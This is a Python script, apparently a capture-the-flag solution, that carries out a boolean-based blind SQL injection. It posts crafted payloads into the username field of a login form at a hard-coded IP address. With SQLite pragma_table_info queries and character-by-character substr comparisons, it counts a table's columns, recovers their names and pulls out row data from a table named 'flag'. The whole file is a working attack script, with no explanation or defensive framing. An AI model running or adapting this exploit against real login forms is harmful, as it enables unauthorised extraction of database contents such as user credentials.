import string
import requests


def inject_payload(value):
    url = "http://104.131.14.61:8191/"
    try:
        form_data = {
            'username': value,
            'password': 'anything..lol'
        }
        response = requests.post(url, data=form_data)

        # Check the response text
        if 'My School Schedule' in response.text:
            return response.text
        else:
            return False
    except requests.RequestException as e:
        print("Error:", e)
        return False


def get_column_count(table_name):
    for i in range(1, 100):  # Adjust the range as needed
        payload = f"' OR (SELECT COUNT(*) FROM pragma_table_info('{table_name}'))={i}-- -"
        if inject_payload(payload):
            print(f'Number of columns in {table_name}: {i}')
            return i
    return 0


import string

def get_column_names(table_name, column_count):
    column_names = []
    for index in range(column_count):
        column_name = ''
        for i in range(1, 100):  # Adjust the range as needed
            column_name_length = len(column_name)
            for s in string.printable:
                payload = (f"' OR (SELECT substr(name, {i}, 1) FROM pragma_table_info('{table_name}') "
                           f"LIMIT 1 OFFSET {index})='{s}'-- -")
                if inject_payload(payload):
                    column_name += s
                    print(column_name)
                    break
            # Check if the column name didn't change
            if len(column_name) == column_name_length:
                break
        column_names.append(column_name)
        print(f'Column {index}: {column_name}')
    return column_names

def fetch_data_from_table(table_name, column_names):
    fetched_data = []
    for row_index in range(0, 15):  # Adjust the range as needed
        row_data = {}
        for column in column_names:
            column_value = ''
            for i in range(1, 100):
                flag = len(column)
                for s in string.printable:
                    payload = (f"' OR (SELECT substr({column}, {i}, 1) FROM {table_name} "
                               f"LIMIT 1 OFFSET {row_index})='{s}'-- -")
                    if inject_payload(payload):
                        column_value += s
                        print(column_value)
                        break
                if flag == len(column_value):   # No more characters in the cell
                    break
            if column_value:
                row_data[column] = column_value
        if row_data:
            fetched_data.append(row_data)
    return fetched_data


# Define the table name
table_name = 'flag'

# Step 1: Retrieve column names
column_count = get_column_count(table_name)
if column_count > 0:
    column_names = get_column_names(table_name, column_count)
    print(f'Column names: {column_names}')

    # Step 2: Retrieve data from the table
    data_from_table = fetch_data_from_table(table_name, column_names)
    print(f'Data from table {table_name}: {data_from_table}')
else:
    print(f'Failed to retrieve column count for table {table_name}')
